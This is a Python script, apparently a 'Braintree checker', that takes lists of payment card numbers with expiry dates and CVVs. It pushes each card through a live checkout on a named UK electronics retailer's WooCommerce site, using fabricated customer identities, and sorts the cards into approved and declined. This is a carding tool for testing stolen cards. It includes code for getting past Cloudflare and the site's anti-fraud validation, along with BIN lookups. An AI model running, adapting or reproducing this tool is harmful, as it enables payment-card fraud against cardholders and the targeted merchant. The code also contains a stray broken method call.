import logging
import re
import cloudscraper
import requests
import base64
import uuid
import json
import random
import time
from urllib.parse import urlparse, quote_plus
import html

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler("braintree_checker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Customer data templates (UK based)
FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Charles", "Joseph", "Thomas",
               "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
              "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
CITIES = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Sheffield", "Bristol", "Edinburgh", "Glasgow", "Cardiff"]
STREETS = ["High Street", "Main Road", "Church Lane", "Park Avenue", "Victoria Road", "Kingsway", "Queen Street", "Station Road", "Green Lane", "Alexandra Road"]

def get_general_headers(target_url=None, referer=None):
    authority = "telonic.co.uk"
    if target_url:
        try:
            parsed_url = urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            pass

    effective_referer = referer or f"https://{authority}/"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", 
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", 
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", 
        "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

def generate_customer_data():
    """Generate random UK customer data with enhanced validation bypass"""
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    
    # Use more realistic email domains to avoid validation blocks
    email_domains = ['gmail.com', 'yahoo.co.uk', 'hotmail.co.uk', 'outlook.com', 'btinternet.com']
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@{random.choice(email_domains)}"
    
    street_num = random.randint(1, 199)
    street = random.choice(STREETS)
    city = random.choice(CITIES)
    
    # Use hardcoded UK postcode
    postcode = "SW1A 1AA"
    
    # Generate UK phone number
    phone = "+447979136852"

    return {
        'first_name': first_name,
        'last_name': last_name,
        'email': email,
        'address': f"{street_num} {street}",
        'city': city,
        'postcode': postcode,
        'country': 'GB',
        'phone': phone
    }

def get_bin_info(bin_number):
    """Get BIN information for a card"""
    if not bin_number or len(bin_number) < 6:
        return {"error": "Invalid BIN"}

    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=10)
        if response.status_code != 200:
            return {"error": f"API returned {response.status_code}"}

        data = response.json()
        return {
            "Scheme": data.get("scheme", "N/A").upper(),
            "Type": data.get("type", "N/A").upper(),
            "Brand": data.get("brand", "N/A"),
            "Country": data.get("country", {}).get("name", "N/A"),
            "Bank": data.get("bank", {}).get("name", "N/A"),
        }
    except Exception as e:
        return {"error": f"Lookup failed: {e}"}

def extract_cart_nonce(html_content):
    """Extract cart nonce using multiple methods"""
    patterns = [
        # Standard WooCommerce nonce patterns
        r'name="woocommerce-product-add-to-cart-nonce" value="([^"]+)"',
        r'woocommerce-product-add-to-cart-nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'addToCartNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'add_to_cart_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'data-nonce=["\']([^"\']+)["\']',

        # General nonce patterns
        r'name="_wpnonce" value="([^"]+)"',
        r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',

        # AJAX nonce patterns
        r'wc_ajax_params.*?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'ajax_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',

        # Script variable patterns
        r'var\s+\w*[nN]once\w*\s*=\s*["\']([^"\']+)["\']',
        r'let\s+\w*[nN]once\w*\s*=\s*["\']([^"\']+)["\']',
        r'const\s+\w*[nN]once\w*\s*=\s*["\']([^"\']+)["\']',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            if len(match) > 10:  # Nonces are typically longer than 10 characters
                logger.info(f"Found cart nonce with pattern: {pattern}")
                return match

    # Try to find in form inputs
    form_patterns = [
        r'<input[^>]*name=["\']([^"\']*[nN]once[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']',
        r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']([^"\']*[nN]once[^"\']*)["\']',
    ]

    for pattern in form_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for name, value in matches:
            if len(value) > 10:
                logger.info(f"Found cart nonce in form input: {name}")
                return value

    return None

def extract_braintree_token(html_content):
    """Extract Braintree token using multiple methods"""
    patterns = [
        # Direct token patterns
        r'var wc_braintree_client_token = \["([^"]+)"\]',
        r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
        r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'authorizationFingerprint["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'braintreeClientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',

        # JSON patterns
        r'clientToken":"([^"]+)"',
        r'authorizationFingerprint":"([^"]+)"',
        r'braintreeClientToken":"([^"]+)"',
        r'"token":"([^"]+)"',

        # Script content patterns
        r'<script[^>]*>.*?clientToken.*?=.*?["\']([^"\']+)["\'].*?</script>',
        r'<script[^>]*>.*?authorizationFingerprint.*?=.*?["\']([^"\']+)["\'].*?</script>',
        r'<script[^>]*>.*?braintreeClientToken.*?=.*?["\']([^"\']+)["\'].*?</script>',

        # Base64 encoded patterns
        r'eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if len(match) > 50:  # Tokens are typically longer than 50 characters
                logger.info(f"Found braintree token with pattern: {pattern}")
                return match

    # Try to find in specific script tags
    script_patterns = [
        r'<script[^>]*id="wc-braintree-client-manager-js-extra"[^>]*>(.*?)</script>',
        r'<script[^>]*id="wc-braintree-[^"]*"[^>]*>(.*?)</script>',
        r'<script[^>]*data-id="braintree[^"]*"[^>]*>(.*?)</script>',
    ]

    for pattern in script_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
        for script_content in matches:
            # Look for token in script content
            token_patterns = [
                r'var wc_braintree_client_token = \["([^"]+)"\]',
                r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'authorizationFingerprint["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]

            for token_pattern in token_patterns:
                token_matches = re.findall(token_pattern, script_content, re.IGNORECASE)
                for token_match in token_matches:
                    if len(token_match) > 50:
                        logger.info(f"Found braintree token in script with pattern: {token_pattern}")
                        return token_match

    return None

def add_to_cart(session, product_id=13950, quantity=1):
    """Add product to cart before checkout using multiple methods"""
    try:
        logger.info(f"Adding product {product_id} to cart...")

        # Method 1: Direct AJAX request
        add_to_cart_url = "https://telonic.co.uk/?wc-ajax=add_to_cart"

        cart_data = {
            'product_sku': 'Sensepeek4020',
            'product_id': str(product_id),
            'quantity': str(quantity),
        }

        cart_headers = get_general_headers(target_url=add_to_cart_url)
        cart_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        cart_headers['x-requested-with'] = 'XMLHttpRequest'

        cart_response = session.post(add_to_cart_url, headers=cart_headers, data=cart_data, timeout=20)
        if cart_response.status_code == 200:
            try:
                cart_result = cart_response.json()
                if cart_result.get('success'):
                    logger.info("Product successfully added to cart via AJAX")
                    return True
            except json.JSONDecodeError:
                logger.warning(f"Cart response is not JSON: {cart_response.text[:200]}...")
                # Check if it's a Cloudflare or other protection page
                if 'cloudflare' in cart_response.text.lower() or 'challenge' in cart_response.text.lower():
                    logger.error("Cloudflare challenge detected - site may be protected")
                return False

        # Method 2: Visit product page and extract nonce first
        product_url = f"https://telonic.co.uk/product/4020-sensepeek-pcbite-magnifier-3x/"
        headers = get_general_headers(target_url=product_url)
        product_response = session.get(product_url, headers=headers, timeout=30)
        product_response.raise_for_status()

        # Extract cart nonce using multiple methods
        cart_nonce = extract_cart_nonce(product_response.text)

        if cart_nonce:
            # Add to cart with nonce
            cart_data_with_nonce = {
                'product_sku': 'Sensepeek4020',
                'product_id': str(product_id),
                'quantity': str(quantity),
                'add-to-cart': str(product_id),
                'woocommerce-product-add-to-cart-nonce': cart_nonce
            }

            cart_response = session.post(add_to_cart_url, headers=cart_headers, data=cart_data_with_nonce, timeout=20)
            if cart_response.status_code == 200:
                try:
                    cart_result = cart_response.json()
                    if cart_result.get('success'):
                        logger.info("Product successfully added to cart with nonce")
                        return True
                except json.JSONDecodeError:
                    logger.warning("Cart with nonce response is not JSON")
                    return False

        # Method 3: Try the direct form submission approach
        form_data = {
            'add-to-cart': str(product_id),
            'quantity': str(quantity)
        }

        if cart_nonce:
            form_data['woocommerce-product-add-to-cart-nonce'] = cart_nonce

        form_response = session.post(product_url, headers=headers, data=form_data, timeout=20)
        if form_response.status_code == 200 and "has been added to your cart" in form_response.text:
            logger.info("Product successfully added to cart via form submission")
            return True

        logger.warning("All cart addition methods failed")
        return False

    except Exception as e:
        logger.error(f"Error adding to cart: {str(e)}")
        return False

def process_card(card_line):
    """Process a single card through telonic.co.uk checkout"""
    card_parts = card_line.strip().split('|')
    if len(card_parts) < 4:
        return None, "Invalid card format"

    cc, mm, yy, cvv = card_parts[:4]
    cc = cc.strip()
    mm = mm.strip().zfill(2)
    yy = yy.strip()
    cvv = cvv.strip()

    # Handle both 2-digit and 4-digit year formats
    if len(yy) == 2:
        # Convert 2-digit year to 4-digit (assuming 2000s)
        exp_year_full = f"20{yy}"
    elif len(yy) == 4:
        exp_year_full = yy
    else:
        return card_line, "Invalid expiration year format"

    if len(cc) < 15 or len(cc) > 19:
        return card_line, "Invalid card number"

    customer_data = generate_customer_data()
    logger.info(f"Processing card: {cc[-4:]} with customer: {customer_data['first_name']} {customer_data['last_name']}")

    try:
        scraper = cloudscraper.create_scraper()
        result = _sync_checkout_telonic(scraper, {'cc': cc, 'mm': mm, 'yy': exp_year_full, 'cvv': cvv}, customer_data)
        return card_line, result
    except Exception as e:
        return card_line, {"is_approved": False, "summary": "ERROR", "message": f"Processing failed: {str(e)}", "raw_response": str(e)}

def _sync_checkout_telonic(session, card_data, customer_data):
    """Dedicated function for telonic.co.uk checkout"""
    cc, mm, yy, cvv = card_data['cc'], card_data['mm'], card_data['yy'], card_data['cvv']
    base_domain = "telonic.co.uk"
    exp_year_full = yy  # Already converted to 4-digit format

    fname = customer_data['first_name']
    lname = customer_data['last_name']
    email = customer_data['email']
    address = customer_data['address']
    city = customer_data['city']
    postcode = customer_data['postcode']
    country = customer_data['country']

    try:
        # 0. ADD PRODUCT TO CART FIRST
        if not add_to_cart(session):
            logger.warning("Proceeding without cart addition - may fail at checkout")

        # 1. GET CHECKOUT PAGE FOR NONCE & TOKEN
        logger.info(f"[{cc[-4:]}] Loading checkout page...")
        checkout_url = f"https://{base_domain}/checkout/"
        checkout_headers = get_general_headers(target_url=checkout_url)
        checkout_page_req = session.get(checkout_url, headers=checkout_headers, timeout=30)
        checkout_page_req.raise_for_status()

        # 2. EXTRACT WOOCOMMERCE NONCE
        checkout_nonce_patterns = [
            r'name="woocommerce-process-checkout-nonce" value="([^"]+)"',
            r'woocommerce-process-checkout-nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'checkout_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'var wc_braintree_client_manager_params = {[^}]*"_wpnonce":"([^"]+)"',
            r'name="_wpnonce" value="([^"]+)"',
            r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]

        wc_nonce = None
        for pattern in checkout_nonce_patterns:
            match = re.search(pattern, checkout_page_req.text)
            if match:
                wc_nonce = match.group(1)
                logger.info(f"[{cc[-4:]}] Found checkout nonce with pattern: {pattern}")
                break

        if not wc_nonce:
            wc_nonce = extract_cart_nonce(checkout_page_req.text)
            if wc_nonce:
                logger.info(f"[{cc[-4:]}] Found checkout nonce using general extraction")

        if not wc_nonce:
            return {
                "is_approved": False, 
                "summary": "NONCE_ERROR", 
                "message": "Checkout nonce not found", 
                "raw_response": checkout_page_req.text[:500] + "..." if len(checkout_page_req.text) > 500 else checkout_page_req.text
            }

        # 3. EXTRACT BRAINTREE CLIENT TOKEN
        client_token = extract_braintree_token(checkout_page_req.text)

        if not client_token:
            # Try to get token from API directly
            try:
                token_url = "https://telonic.co.uk/?wc-ajax=wc_braintree_frontend_request&path=/wc-braintree/v1/client-token/create"
                token_headers = get_general_headers(target_url=token_url)
                token_headers['x-requested-with'] = 'XMLHttpRequest'

                token_response = session.post(token_url, headers=token_headers, timeout=20)
                if token_response.status_code == 200:
                    token_data = token_response.json()
                    if 'clientToken' in token_data:
                        client_token = token_data['clientToken']
                        logger.info(f"[{cc[-4:]}] Found client token via API")
            except Exception as e:
                logger.warning(f"[{cc[-4:]}] API token request failed: {str(e)}")

        if not client_token:
            return {
                "is_approved": False, 
                "summary": "TOKEN_ERROR", 
                "message": "Braintree token not found", 
                "raw_response": checkout_page_req.text[:500] + "..." if len(checkout_page_req.text) > 500 else checkout_page_req.text
            }

        # 4. DECODE CLIENT TOKEN
        try:
            # Add padding if needed
            if len(client_token) % 4:
                client_token += '=' * (4 - len(client_token) % 4)
            decoded_token = json.loads(base64.b64decode(client_token))
            auth_fingerprint = decoded_token['authorizationFingerprint']
        except Exception as e:
            return {
                "is_approved": False, 
                "summary": "DECODE_ERROR", 
                "message": f"Failed to decode token: {str(e)}", 
                "raw_response": client_token
            }

        # 5. TOKENIZE CARD
        logger.info(f"[{cc[-4:]}] Tokenizing card...")
        gql_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }

        gql_payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': exp_year_full, 'cvv': cvv}}},
            'operationName': 'TokenizeCreditCard',
        }

        gql_req = session.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, timeout=30)
        gql_req.raise_for_status()
        gql_response = gql_req.json()

        if 'errors' in gql_response:
            return {
                "is_approved": False, 
                "summary": "TOKENIZE_ERROR", 
                "message": f"Card tokenization failed: {gql_response.get('errors', [{}])[0].get('message', 'Unknown error')}", 
                "raw_response": gql_response
            }

        payment_nonce = gql_response['data']['tokenizeCreditCard']['token']

        # 6. UPDATE ORDER REVIEW
        logger.info(f"[{cc[-4:]}] Updating order review...")
        update_url = f"https://{base_domain}/?wc-ajax=update_order_review"
        
        phone = customer_data['phone']

        update_data = {
            'payment_method': 'braintree_cc',
            'country': country,
            'postcode': postcode,
            'city': city,
            'address': address,
            'billing_first_name': fname,
            'billing_last_name': lname,
            'billing_email': email,
            'billing_phone': phone,
            'billing_country': country,
            'billing_postcode': postcode,
            'billing_city': city,
            'billing_address_1': address,
            'shipping_method[0]': 'flat_rate:2',
            'woocommerce-process-checkout-nonce': wc_nonce,
            '_wp_http_referer': '/checkout/'
        }

        update_headers = get_general_headers(target_url=update_url)
        update_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        update_headers['x-requested-with'] = 'XMLHttpRequest'

        update_response = session.post(update_url, headers=update_headers, data=update_data, timeout=20)
        update_data = update_response.json()

        # 7. PLACE ORDER
        logger.info(f"[{cc[-4:]}] Placing order...")
        order_url = f"https://{base_domain}/?wc-ajax=checkout"

        # Extract JGAM form nonce from checkout page
        jgam_nonce_pattern = r'name="jgam_form_nonce" value="([^"]+)"'
        jgam_nonce_match = re.search(jgam_nonce_pattern, checkout_page_req.text)
        jgam_nonce = jgam_nonce_match.group(1) if jgam_nonce_match else ""

        order_data = {
            'jgam_form_nonce': jgam_nonce,
            '_wp_http_referer': '/checkout/',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'billing_first_name': fname,
            'billing_last_name': lname,
            'billing_company': '',
            'billing_country': country,
            'billing_address_1': address,
            'billing_address_2': '',
            'billing_city': city,
            'billing_state': '',
            'billing_postcode': postcode,
            'billing_phone': phone,
            'billing_email': email,
            'shipping_first_name': fname,
            'shipping_last_name': lname,
            'shipping_company': '',
            'shipping_country': country,
            'shipping_address_1': address,
            'shipping_address_2': '',
            'shipping_city': city,
            'shipping_state': '',
            'shipping_postcode': postcode,
            'shipping_method[0]': 'flat_rate:2',
            'payment_method': 'braintree_cc',
            'braintree_cc_payment_nonce': payment_nonce,
            'braintree_cc_device_data': '{"correlation_id":"' + str(uuid.uuid4()).replace("-", "") + '"}',
            'terms': '1',
            'terms-field': '1',
            'woocommerce-process-checkout-nonce': wc_nonce,
            'save_payment_method': '',
            'wc-braintree-new-payment-method': 'true'
        }

        order_headers = get_general_headers(target_url=order_url)
        order_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        order_headers['x-requested-with'] = 'XMLHttpRequest'

        # Add additional headers that might bypass JGAM validation
        order_headers.update({
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'origin': f'https://{base_domain}'
        })

        order_req = session.post(order_url, headers=order_headers, data=order_data, timeout=30)
        
        # Handle different response types
        try:
            order_response = order_req.json()
        except json.JSONDecodeError:
            # Response is not JSON, might be HTML or plain text
            order_response = {
                "raw_html": order_req.text,
                "status_code": order_req.status_code,
                "url": order_req.url
            }

        # 8. ANALYZE RESPONSE
        logger.info(f"[{cc[-4:]}] Order response status: {order_req.status_code}")
        logger.info(f"[{cc[-4:]}] Order response URL: {order_req.url}")
        logger.info(f"[{cc[-4:]}] Order response type: {'JSON' if isinstance(order_response, dict) and 'raw_html' not in order_response else 'HTML/Text'}")

        # Parse WooCommerce response properly
        response_text = order_req.text if hasattr(order_req, 'text') else str(order_response)
        
        # Check for success indicators
        if order_req.status_code == 200:
            # Check if it's a successful JSON response
            if isinstance(order_response, dict) and 'raw_html' not in order_response:
                if order_response.get('result') == 'success' and order_response.get('redirect'):
                    return {
                        "is_approved": True, 
                        "summary": "APPROVED", 
                        "message": "Order created successfully", 
                        "raw_response": order_response
                    }
                elif 'messages' in order_response or 'message' in order_response:
                    message = order_response.get('messages', order_response.get('message', 'Payment declined'))
                    return _parse_error_message(message, order_response, cc)
            
            # Parse HTML response for WooCommerce error format
            error_patterns = [
                r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>',
                r'<li[^>]*>(.*?There was an error processing your payment.*?)</li>',
                r'Reason:\s*([^<]+)',
                r'<div class="woocommerce-message"[^>]*>(.*?)</div>',
                r'<div class="woocommerce-error"[^>]*>(.*?)</div>'
            ]
            
            for pattern in error_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    clean_message = re.sub(r'<[^>]+>', '', match).strip()
                    if clean_message:
                        return self._parse_error_message(clean_message, order_response, cc)
            
            # Check for hidden error inputs
            if 'wc_braintree_checkout_error' in response_text and 'value="true"' in response_text:
                # Extract processor response
                if 'processor declined' in response_text.lower():
                    return {"is_approved": False, "summary": "DECLINED - Processor", "message": "Processor Declined", "raw_response": order_response}
                elif 'insufficient funds' in response_text.lower():
                    return {"is_approved": False, "summary": "DECLINED - Insufficient Funds", "message": "Insufficient Funds", "raw_response": order_response}
                elif 'do not honor' in response_text.lower():
                    return {"is_approved": False, "summary": "DECLINED - Do Not Honor", "message": "Do Not Honor", "raw_response": order_response}
                else:
                    return {"is_approved": False, "summary": "DECLINED", "message": "Payment processing error", "raw_response": order_response}
            
            # Check if redirected to success page
            if 'order-received' in str(order_req.url) or 'thank-you' in response_text.lower():
                return {
                    "is_approved": True,
                    "summary": "APPROVED",
                    "message": "Redirected to order confirmation",
                    "raw_response": order_response
                }
        
        # Handle HTML/text response
        elif isinstance(order_response, dict) and 'raw_html' in order_response:
            html_content = order_response['raw_html'].lower()
            
            # Check for success indicators in HTML
            success_indicators = [
                'order received',
                'thank you',
                'order confirmation',
                'payment successful',
                'order complete'
            ]
            
            decline_indicators = [
                'payment failed',
                'declined',
                'insufficient funds',
                'invalid card',
                'expired card',
                'do not honor',
                'transaction not permitted',
                'restricted card',
                'security code',
                'cvv'
            ]
            
            for indicator in success_indicators:
                if indicator in html_content:
                    return {
                        "is_approved": True,
                        "summary": "APPROVED",
                        "message": f"Success detected: {indicator}",
                        "raw_response": order_response
                    }
            
            for indicator in decline_indicators:
                if indicator in html_content:
                    return {
                        "is_approved": False,
                        "summary": "DECLINED",
                        "message": f"Decline reason: {indicator}",
                        "raw_response": order_response
                    }
            
            # Check if redirected to success page
            if order_req.status_code == 302 or 'checkout/order-received' in str(order_req.url):
                return {
                    "is_approved": True,
                    "summary": "APPROVED",
                    "message": "Redirected to order confirmation",
                    "raw_response": order_response
                }
            
            return {
                "is_approved": False,
                "summary": "UNKNOWN",
                "message": f"HTML response - Status: {order_req.status_code}",
                "raw_response": order_response
            }
        
        # Fallback for unexpected response format
        return {
            "is_approved": False,
            "summary": "ERROR",
            "message": "Unexpected response format",
            "raw_response": order_response
        }

    except Exception as e:
        logger.error(f"[{cc[-4:]}] Error: {str(e)}")
        return {
            "is_approved": False, 
            "summary": "ERROR", 
            "message": f"Processing error: {str(e)[:100]}", 
            "raw_response": str(e)
        }

def _parse_error_message(message, raw_response, cc):
    """Parse error message and categorize the response"""
    message_lower = message.lower() if isinstance(message, str) else str(message).lower()
    
    # Handle JGAM validation error
    if 'jgam_check_user_on_checkout' in message_lower:
        logger.warning(f"[{cc[-4:]}] JGAM validation error detected")
        return {"is_approved": False, "summary": "BLOCKED - JGAM Validation", "message": "Blocked by site validation (card may be valid)", "raw_response": raw_response}
    
    # Parse specific decline reasons
    if 'processor declined' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - Processor", "message": message, "raw_response": raw_response}
    elif 'insufficient funds' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - Insufficient Funds", "message": message, "raw_response": raw_response}
    elif 'do not honor' in message_lower or '2000' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - Do Not Honor", "message": message, "raw_response": raw_response}
    elif 'expired' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - Card Expired", "message": message, "raw_response": raw_response}
    elif 'cvv' in message_lower or 'security code' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - CVV Mismatch", "message": message, "raw_response": raw_response}
    elif 'invalid' in message_lower and ('card' in message_lower or 'number' in message_lower):
        return {"is_approved": False, "summary": "DECLINED - Invalid Card", "message": message, "raw_response": raw_response}
    elif 'restricted' in message_lower:
        return {"is_approved": False, "summary": "DECLINED - Restricted", "message": message, "raw_response": raw_response}
    else:
        return {"is_approved": False, "summary": "DECLINED", "message": message, "raw_response": raw_response}

def main():
    """Main function to process cards from file"""
    print("""
    Telonic.co.uk Braintree Checker
    ===============================
    """)

    try:
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip() and '|' in line]
    except FileNotFoundError:
        print("ERROR: cards.txt file not found!")
        print("Create a cards.txt file with format: CC|MM|YY|CVV")
        return

    if not cards:
        print("No valid cards found in cards.txt")
        return

    print(f"Loaded {len(cards)} cards for processing...")
    print("Starting processing...\n")

    results = []
    live_cards = []
    dead_cards = []
    error_cards = []

    for i, card_line in enumerate(cards, 1):
        print(f"[{i}/{len(cards)}] Processing card...")
        card_data, result = process_card(card_line)

        if isinstance(result, dict):
            status = result['summary']
            message = result['message']
            raw_response = result.get('raw_response', 'No raw response')

            if status == "APPROVED":
                live_cards.append(card_data)
                result_color = "✓ APPROVED"
            elif status in ["DECLINED", "DEAD"]:
                dead_cards.append(card_data)
                result_color = "✗ DECLINED"
            else:
                error_cards.append(card_data)
                result_color = "! ERROR"
        else:
            error_cards.append(card_data)
            result_color = "! ERROR"
            message = result
            raw_response = "No raw response"

        # Get BIN info for display
        cc = card_data.split('|')[0]
        bin_info = get_bin_info(cc)
        bin_text = f"{bin_info.get('Scheme', 'N/A')} - {bin_info.get('Bank', 'N/A')}"

        result_line = f"{result_color}: {card_data} | {bin_text} | {message}"
        results.append(result_line)
        print(f"   Result: {result_line}")
        print(f"   Raw Response: {str(raw_response)[:200]}...")  # Show first 200 chars of raw response

        # Add delay between requests
        if i < len(cards):
            time.sleep(2)

    # Print summary
    print("\n" + "="*60)
    print("PROCESSING COMPLETE!")
    print("="*60)
    print(f"Total cards processed: {len(cards)}")
    print(f"Approved cards: {len(live_cards)}")
    print(f"Declined cards: {len(dead_cards)}")
    print(f"Errors: {len(error_cards)}")
    print("\nDetailed results saved to results.txt")

    # Save results to file
    with open('results.txt', 'w') as f:
        f.write("Telonic.co.uk Processing Results\n")
        f.write("="*50 + "\n\n")
        f.write(f"Processed: {len(cards)} | Approved: {len(live_cards)} | Declined: {len(dead_cards)} | Errors: {len(error_cards)}\n\n")

        f.write("APPROVED CARDS:\n")
        f.write("-" * 20 + "\n")
        for card in live_cards:
            f.write(f"{card}\n")

        f.write("\nDECLINED CARDS:\n")
        f.write("-" * 20 + "\n")
        for card in dead_cards:
            f.write(f"{card}\n")

        f.write("\nERRORS:\n")
        f.write("-" * 20 + "\n")
        for card in error_cards:
            f.write(f"{card}\n")

        f.write("\nDETAILED RESULTS:\n")
        f.write("-" * 20 + "\n")
        for result in results:
            f.write(f"{result}\n")

        f.write("\nRAW RESPONSES:\n")
        f.write("-" * 20 + "\n")
        for i, card_line in enumerate(cards):
            if i < len(results):
                f.write(f"Card: {card_line}\n")
                f.write(f"Response: {results[i]}\n")
                f.write("-" * 40 + "\n")

if __name__ == "__main__":
    main()
